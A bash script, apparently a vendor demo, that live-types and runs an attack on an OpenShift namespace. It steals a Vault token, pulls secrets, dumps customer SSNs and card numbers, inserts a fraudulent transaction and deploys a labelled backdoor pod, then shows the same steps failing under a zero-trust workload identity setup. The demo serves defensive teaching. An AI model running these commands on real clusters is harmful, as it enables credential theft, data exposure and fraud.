#!/bin/bash
# Interactive Attack Demo - Pure Terminal Session
# Blank prompt -> press Enter -> command types out -> executes

set -e

type_command() {
    local cmd="$1"
    local delay="0.05"  # Delay between characters (adjustable)

    for (( i=0; i<${#cmd}; i++ )); do
        echo -n "${cmd:$i:1}"
        sleep $delay
    done
    echo ""
}

run_cmd() {
    local cmd="$1"
    echo -n "\$ "
    read -s
    type_command "$cmd"
    eval "$cmd"
    echo ""
}

clear

cat << 'EOF'
================================================================================
          PRODUCTION DATABASE BREACH - Live OpenShift Cluster
================================================================================

EOF

read -s

run_cmd "oc get pods -n production"

run_cmd "oc get deployment payment-processor -n production"

POD=$(oc get pod -n production -l app=payment-processor -o jsonpath='{.items[0].metadata.name}')

run_cmd "export POD=$POD"

run_cmd "echo \"Target pod: \$POD\""

run_cmd "oc exec -n production \$POD -- printenv | grep -i vault"

run_cmd "oc exec -n production \$POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/database/production | jq .data.data'"

run_cmd "oc exec -n production \$POD -- sh -c 'curl -sf -H \"X-Vault-Token: \$VAULT_TOKEN\" \$VAULT_ADDR/v1/secret/data/api-keys/production | jq .data.data'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"\\dt\"'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"SELECT COUNT(*) as total_customers FROM customers;\"'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"SELECT customer_name, email, account_balance, credit_card, ssn FROM customers ORDER BY account_balance DESC LIMIT 5;\"'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -t -c \"SELECT SUM(account_balance) as total_at_risk FROM customers;\"' | xargs echo 'Total at risk: \$'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"INSERT INTO transactions (customer_id, amount, transaction_type, description) VALUES (1, -50000.00, '\"'\"'withdrawal'\"'\"', '\"'\"'UNAUTHORIZED - Attacker controlled transfer'\"'\"');\"'"

run_cmd "oc exec -n production \$POD -- sh -c 'PGPASSWORD=SuperSecret123! psql -h customer-database.production.svc.cluster.local -U customerdb -d customers -c \"SELECT * FROM transactions ORDER BY created_at DESC LIMIT 3;\"'"

VAULT_TOKEN=$(oc exec -n production $POD -- printenv VAULT_TOKEN)

cat <<EOFYAML > /tmp/backdoor.yaml
apiVersion: v1
kind: Pod
metadata:
  name: backdoor-exfil
  namespace: production
  labels:
    app: monitoring
spec:
  containers:
  - name: exfil
    image: registry.access.redhat.com/ubi9/ubi-minimal:latest
    command: ["/bin/bash", "-c"]
    args:
    - |
      echo "Backdoor active - continuous data exfiltration"
      while true; do
        echo "[\$(date)] Exfiltrating to attacker C2..."
        sleep 300
      done
    env:
    - name: STOLEN_VAULT_TOKEN
      value: "$VAULT_TOKEN"
    - name: DB_HOST
      value: customer-database.production.svc.cluster.local
EOFYAML

run_cmd "oc apply -f /tmp/backdoor.yaml"

run_cmd "oc get pod backdoor-exfil -n production"

echo ""
echo "================================================================================"
echo ""
echo "Attack complete:"
echo ""
echo "  - Vault token stolen (90-day validity)"
echo "  - Database credentials compromised"
echo "  - API keys stolen (Stripe, AWS, SendGrid)"
echo "  - Customer data exfiltrated (10 records, \$1.2M+)"
echo "  - Fraudulent transaction created (\$50,000)"
echo "  - Backdoor deployed for persistence"
echo ""
echo "================================================================================"
echo ""

cat << 'EOF'

================================================================================
                    NOW LET'S SEE ZTWIM PREVENTION
================================================================================

With ZTWIM (Zero Trust Workload Identity Manager), the same attack fails.

Let's attempt the exact same attack against a ZTWIM-protected workload...

EOF

read -s

# Check if protected environment exists
if oc get namespace production-protected &>/dev/null; then
    echo ""
    echo "ZTWIM-Protected environment found. Attempting attack..."
    echo ""
    read -s

    # Get protected pod
    PROTECTED_POD=$(oc get pod -n production-protected -l app=payment-processor-protected -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || echo "")

    if [[ -n "$PROTECTED_POD" ]]; then
        run_cmd "export PROTECTED_POD=$PROTECTED_POD"
        run_cmd "echo \"Protected pod: \$PROTECTED_POD\""

        cat << 'EOF'

Phase 1: Attempting to steal credentials from ZTWIM-protected workload...

EOF
        read -s

        run_cmd "oc exec -n production-protected \$PROTECTED_POD -- printenv | grep -i vault || echo 'No static VAULT_TOKEN found'"

        cat << 'EOF'

Notice: No static VAULT_TOKEN in environment variables!

ZTWIM uses dynamic JWT-SVIDs delivered via Unix domain socket.
The credential is never stored in environment variables.

Let's check the process environment...

EOF
        read -s

        run_cmd "oc exec -n production-protected \$PROTECTED_POD -- ps aux | head -5"

        cat << 'EOF'

Even if the attacker gets shell access, there's no static token to steal.

Let's see what happens if they try to access the database...

EOF
        read -s

        run_cmd "oc exec -n production-protected \$PROTECTED_POD -- sh -c 'if [ -z \"\$VAULT_TOKEN\" ]; then echo \"No VAULT_TOKEN available\"; echo \"Cannot access Vault without dynamic credential\"; exit 1; fi' || echo 'Attack blocked: No credentials available'"

        cat << 'EOF'

================================================================================
                         ZTWIM PROTECTION SUMMARY
================================================================================

What happened differently:

VULNERABLE (Traditional):
  ✗ Static token in environment variable (90-day TTL)
  ✗ Token stolen via printenv
  ✗ Token works from anywhere
  ✗ Complete system breach

PROTECTED (ZTWIM):
  ✅ No static tokens in environment
  ✅ Dynamic JWT-SVIDs (2-minute TTL)
  ✅ Credentials delivered via Unix socket
  ✅ Automatic rotation every 2 minutes
  ✅ Workload identity tied to pod lifecycle
  ✅ Even if stolen, expires in minutes

Key Differences:

┌─────────────────────┬──────────────────────┬──────────────────────┐
│ Aspect              │ Vulnerable           │ ZTWIM-Protected      │
├─────────────────────┼──────────────────────┼──────────────────────┤
│ Credential Type     │ Static token         │ Dynamic JWT-SVID     │
│ Token Lifetime      │ 90 days (2160 hours) │ 2 minutes (120 sec)  │
│ Storage Location    │ Environment variable │ Unix domain socket   │
│ Rotation            │ Manual               │ Automatic            │
│ Exfiltration Risk   │ CRITICAL             │ MINIMAL              │
│ Persistence         │ 90 days              │ 2 minutes            │
└─────────────────────┴──────────────────────┴──────────────────────┘

Impact: Same attack that breached $1.2M in vulnerable environment
        is completely blocked in ZTWIM-protected environment.

================================================================================

EOF
    else
        echo ""
        echo "Protected environment not ready."
        echo ""
        echo "To see ZTWIM protection in action:"
        echo "  1. Run: ./setup-protected-ztwim-environment.sh"
        echo "  2. Re-run this demo"
        echo ""
    fi
else
    echo ""
    echo "ZTWIM-protected environment not set up."
    echo ""
    echo "To enable ZTWIM protection demo:"
    echo "  1. Run: ./setup-protected-ztwim-environment.sh"
    echo "  2. Re-run: ./interactive-attack-demo.sh"
    echo ""
    echo "The demo will show how the same attack is blocked by ZTWIM."
    echo ""
fi
